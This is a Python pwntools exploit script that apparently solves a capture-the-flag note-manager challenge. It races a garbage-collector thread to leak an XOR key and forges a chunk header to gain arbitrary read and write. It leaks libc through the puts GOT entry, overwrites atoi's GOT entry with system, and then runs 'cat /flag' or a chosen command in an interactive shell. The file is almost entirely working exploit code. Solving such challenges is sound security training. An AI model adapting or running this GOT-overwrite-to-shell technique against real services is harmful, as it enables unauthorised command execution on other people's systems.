#!/usr/bin/env python3
import os
from pwn import *
context.binary = elf = ELF("./attachments/main", checksec=False)
context.log_level = "debug"
host = "nc1.ctfplus.cn"
port = 26706
fake_off = 0x388
space1 = 0x4718
local_libc = "/usr/lib/x86_64-linux-gnu/libc.so.6"
if not os.path.exists(local_libc):
    local_libc = "/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF("./attachments/libc.so.6", checksec=False) if args.REMOTE else ELF(local_libc, checksec=False)

def start():
    if args.REMOTE:
        return remote(host, port)
    io = process([b"./attachments/main"])
    if args.GDB:
        gdb.attach(
            io,
            gdbscript="""
            set pagination off
            set disassembly-flavor intel
            b main
            b Main
            b GetSlotOffset
            b ShowNote
            b EditNote
            b GarbageClean
            b *GarbageClean+0x4e
            b *GarbageClean+0x67
            b *GarbageClean+0x157
            b *ShowNote+0x47
            b *EditNote+0x37
            """,
        )
        pause()
    return io

def cmd(c):
    io.sendlineafter(b"Please input your choice:", str(c).encode())
def add(data, first=False):
    if first:
        io.sendline(b"1")
    else:
        cmd(1)
    io.sendlineafter(b"Give me the size of note:", b"8")
    io.sendafter(b"Give me the content of note:", data)
def edit(idx, data):
    cmd(3)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"Give me the new content of note:", data)
def show(idx):
    cmd(4)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.recvuntil(b"Your content:\n")
    return io.recvn(8)
def wait_boot():
    ok1 = 0
    ok2 = 0
    while not (ok1 and ok2):
        s = io.recvline()
        if b"Please input your choice:" in s:
            ok1 = 1
        if b"Lalalalalalala." in s:
            ok2 = 1
def wait_gc():
    while True:
        s = io.recvline()
        if b"GC: Be quiet." in s:
            return
def wait_until(token):
    while True:
        if token in io.recvline():
            return
def race_show(idx):
    cmd(4)
    io.recvuntil(b"Index: ")
    wait_gc()
    io.sendline(str(idx).encode())
    io.recvuntil(b"Your content:\n")
    return io.recvn(8)
def race_edit(idx, data):
    cmd(3)
    io.recvuntil(b"Index: ")
    wait_gc()
    io.sendline(str(idx).encode())
    io.sendafter(b"Give me the new content of note:", data)
def note0_to(addr):
    off = (addr - space1 - 8) & 0xffffffff
    edit(7, p32(off) + p32(8))
def pwn():
    libc.address = 0
    wait_boot()

    add(b"AAAAAAA1", first=True)
    add(b"BBBBBBB2")
    add(b"CCCCCCC3")
    add(b"DDDDDDD4")

    leak = race_show(1)
    key = u32(leak[4:]) ^ 0x80000
    log.success("key = %#x" % key)

    wait_until(b"GC: Be quiet.")
    wait_until(b"GC: Music.")

    add(b"EEEEEEE5", first=True)
    add(b"FFFFFFF6")
    add(b"QQQQQQQQ")
    add(b"HHHHHHH8")

    fake = p16(fake_off) + p16(8) + p32(key ^ ((8 << 16) | fake_off))
    race_edit(5, fake)

    note0_to(elf.got["puts"])
    puts_addr = u64(show(0))
    libc.address = puts_addr - libc.sym["puts"]
    if libc.address & 0xfff:
        raise RuntimeError("bad libc leak")
    log.success("puts = %#x" % puts_addr)
    log.success("libc = %#x" % libc.address)

    note0_to(elf.got["atoi"])
    edit(0, p64(libc.sym["system"]))
    log.success("atoi -> system")
for i in range(10):
    io = start()
    try:
        pwn()
        break
    except Exception as e:
        log.warning("try %d failed: %s" % (i + 1, e))
        io.close()
else:
    raise SystemExit("fail")

if args.CMD:
    io.sendlineafter(b"Please input your choice:", args.CMD.encode())
elif args.REMOTE:
    io.sendlineafter(b"Please input your choice:", b"cat /flag")
io.interactive()
